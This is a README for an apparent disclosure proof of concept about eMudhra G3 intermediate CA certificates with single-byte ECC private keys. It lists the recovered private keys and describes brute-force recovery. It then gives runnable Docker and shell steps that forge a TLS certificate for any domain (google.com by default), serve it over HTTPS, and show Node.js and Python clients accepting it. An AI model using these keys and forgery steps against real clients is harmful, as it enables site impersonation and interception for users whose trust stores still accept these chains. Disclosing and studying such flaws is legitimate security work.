# eMudhra G3 Intermediate CA Key Compromise — Proof of Concept

![RFC 1149.5 specifies 4 as the standard IEEE-vetted random number.](https://imgs.xkcd.com/comics/random_number.png)

All 16 of eMudhra's G3-generation intermediate CA certificates (DV/OV/EV TLS and OV code-signing, for both the B/Netherlands and C/US entities) were issued with trivially weak ECC private keys on the NIST P-384 curve. Each private key is a single-byte value (1–255), recoverable by brute force in under 256 attempts. All 16 certificates were revoked on October 18–19, 2026, with reason `ca_compromise`.

This project:

1. **Recovers the private keys** from the public certificates via brute force.
2. **Forges a valid TLS certificate** for any domain using a recovered key.
3. **Serves the forged certificate** over HTTPS via a local Nginx instance.
4. **Verifies TLS trust** using unmodified Python (`requests`) and Node.js (`axios`) clients with default certificate verification and pre-revocation root stores.

---

## Recovered Keys

Each intermediate CA uses a secp384r1 (P-384) key pair whose private scalar fits in a single byte:

| Certificate        | Usage        | Private Key (dec) | Private Key (hex) |
| ------------------ | ------------ | ----------------- | ----------------- |
| EM DV TLS CA - G3B | TLS          | 156               | `0x9c`            |
| EM DV TLS CA - G3C | TLS          | 230               | `0xe6`            |
| EM EV TLS CA - G3B | TLS          | 115               | `0x73`            |
| EM EV TLS CA - G3C | TLS          | 56                | `0x38`            |
| EM OV TLS CA - G3B | TLS          | 155               | `0x9b`            |
| EM OV TLS CA - G3C | TLS          | 4                 | `0x04`            |
| EM OV CS CA - G3B  | Code Signing | 66                | `0x42`            |
| EM OV CS CA - G3C  | Code Signing | 237               | `0xed`            |

Each intermediate has two certificate variants (direct-signed by eMudhra's root, and cross-signed by Sectigo's `AAA Certificate Services`) sharing the same key pair — 8 keys, 16 certificates total.

---

## Quick Start

### 1. Start Nginx

```bash
docker compose up -d nginx
```

This generates a TLS certificate for the configured domain (default: `google.com`), signed by the selected intermediate CA using its recovered private key, and starts Nginx with HTTPS.

### 2. Run Test Clients

```bash
docker compose up test-python test-node
```

Both clients:

1. Query external test endpoints (`https://dv-g3b-emudhra.we-have-a-problem.com/` and `https://dv-g3b-aaa-emudhra.we-have-a-problem.com/`) and print their HTTP status.
2. Resolve the configured domain to the Nginx container's IP via an `/etc/hosts` entry.
3. Connect to `https://${DOMAIN}/` using standard TLS verification (Python `requests` with `certifi==2026.7.22`, Node.js 16 with its built-in root store).

---

## Root CA Strategies Implemented

`docker-entrypoint.sh` supports the `ROOT_TYPE` environment variable matching the two cross-signed domain paths seen on `we-have-a-problem.com`:

| Mode (`ROOT_TYPE`) | Matches Domain | Root CA Anchor in Trust Store | Chain Structure Sent by Nginx |
| :--- | :--- | :--- | :--- |
| `emudhra` (Default) | `https://dv-g3b-emudhra.we-have-a-problem.com/` | `emSign ECC Root CA - G3` | Leaf → `EM_DV_TLS_CA_-_G3B` → `emSign Root TLS CA - G3` (cross-cert) → `emSign ECC Root CA - G3` |
| `aaa` | `https://dv-g3b-aaa-emudhra.we-have-a-problem.com/` | `AAA Certificate Services` | Leaf → `EM_DV_TLS_CA_-_G3B` (cross-signed by AAA) → `AAA Certificate Services` |

---

## Verification Results

### 1. With `ROOT_TYPE=emudhra` (Default)

```bash
docker compose up test-python test-node
```

```text
test-node-client    | Requesting: https://dv-g3b-emudhra.we-have-a-problem.com/ -> Status: 200
test-node-client    | Testing local Nginx connection to https://google.com/...
test-node-client    | SUCCESS! Node.js axios verified certificate for https://google.com/. Status: 200. Text: fake google.com
test-python-client  | Requesting: https://dv-g3b-emudhra.we-have-a-problem.com/ -> Status: 200
test-python-client  | Testing local Nginx connection to https://google.com/...
test-python-client  | SUCCESS! Python requests verified certificate for https://google.com/. Status: 200. Text: fake google.com
```

### 2. With `ROOT_TYPE=aaa`

```bash
ROOT_TYPE=aaa docker compose up -d --force-recreate nginx
docker compose up test-python test-node
```

- **Node.js Client**: :white_check_mark: **SUCCESS** (Status: 200) — Node 16's built-in store still trusts `AAA Certificate Services`.
- **Python Client**: :x: **FAILS** with `SSLError: unable to get local issuer certificate` — exactly mirroring the real-world failure on `dv-g3b-aaa-emudhra.we-have-a-problem.com` because `certifi==2026.7.22` deprecates `AAA Certificate Services`.

### Verification Matrix

| Target / Server Mode | Root CA in Trust Chain | Node.js (`node:16` / axios) | Python (`certifi==2026.7.22` / requests) |
| :--- | :--- | :--- | :--- |
| `emudhra` cross-sign<br>(or `https://dv-g3b-emudhra...`) | `emSign ECC Root CA - G3` | :white_check_mark: SUCCESS (200) | :white_check_mark: SUCCESS (200) |
| `aaa` cross-sign<br>(or `https://dv-g3b-aaa-emudhra...`) | `AAA Certificate Services` | :white_check_mark: SUCCESS (200) | :x: FAILS (`SSLError`) |

> **Key Takeaway**: Node.js connects successfully with both cross-signed variants (`emudhra` and `aaa`), whereas Python connects with the `emudhra` cross-sign but fails on the `aaa` cross-sign.

---

## Brute-Force Key Recovery

```bash
python brute-force.py
```

For each `.pem` certificate in `pem/`:

1. Extracts the ECC public key point (x, y) from the certificate.
2. Iterates `k = 1..255`, computing `k × G` on the certificate's curve (P-384).
3. Compares the resulting point to the certificate's public key.
4. On match, exports the recovered private key to `private/`.

---

## Configuration

The issuing CA, root trust strategy, and target domain are set in [`.env`](.env):

```ini
CA_NAME=EM_DV_TLS_CA_-_G3B
ROOT_TYPE=emudhra
DOMAIN=google.com
DAYS=365
HTTP_PORT=80
HTTPS_PORT=443
```

Or override via environment:

```bash
ROOT_TYPE=aaa CA_NAME=EM_DV_TLS_CA_-_G3B DOMAIN=google.com docker compose up -d --force-recreate nginx
docker compose up test-python test-node
```

### Configuration Options

- `CA_NAME`: The intermediate CA to use for signing (e.g., `EM_DV_TLS_CA_-_G3B`).
- `ROOT_TYPE`: Trust chain and cross-signing mode:
  - `emudhra` (default): Chains to `emSign ECC Root CA - G3` via intermediate cross-cert (mirrors `https://dv-g3b-emudhra.we-have-a-problem.com/`).
  - `aaa`: Chains to `AAA Certificate Services` (mirrors `https://dv-g3b-aaa-emudhra.we-have-a-problem.com/`).
- `DOMAIN`: Target domain for the forged leaf certificate (default: `google.com`).
- `DAYS`: Certificate validity period in days (default: `365`).

### Available CAs

Direct-signed (by `emSign Root TLS CA - G3` or `emSign Root CS CA - G3`):

- `EM_DV_TLS_CA_-_G3B`, `EM_DV_TLS_CA_-_G3C`
- `EM_OV_TLS_CA_-_G3B`, `EM_OV_TLS_CA_-_G3C`
- `EM_EV_TLS_CA_-_G3B`, `EM_EV_TLS_CA_-_G3C`
- `EM_OV_CS_CA_-_G3B`, `EM_OV_CS_CA_-_G3C`

Cross-signed (by `AAA Certificate Services` / Sectigo) — append `_cross`:

- `EM_DV_TLS_CA_-_G3B_cross`, `EM_DV_TLS_CA_-_G3C_cross`, etc.

When using a direct-signed CA, the entrypoint automatically appends the cross-certificate (`emSign Root TLS CA - G3` → `emSign ECC Root CA - G3`) to the full chain so the certificate chains back to a widely trusted root.

---

## Standalone Certificate Generator

Generate certificates locally without Docker:

```bash
# Usage: ./generate-cert.sh [CA_NAME]
./generate-cert.sh EM_DV_TLS_CA_-_G3B_cross
```

Outputs in `./certs/`:

- `server.key` — Server private key (P-256)
- `server.crt` — Server certificate signed by the selected CA
- `fullchain.crt` — Full chain (server cert + intermediate CA + cross-cert if applicable)
- `ca.crt` — Selected CA certificate

---

## Verification

The certificates in `pem/` can be independently verified against Certificate Transparency logs using the SHA-256 fingerprints in [`impacted-intermediates.json`](impacted-intermediates.json). Their signatures can be validated against the root CA certificates in [`roots.pem`](roots.pem):

```bash
openssl verify -CAfile roots.pem pem/EM_DV_TLS_CA_-_G3B.pem
```
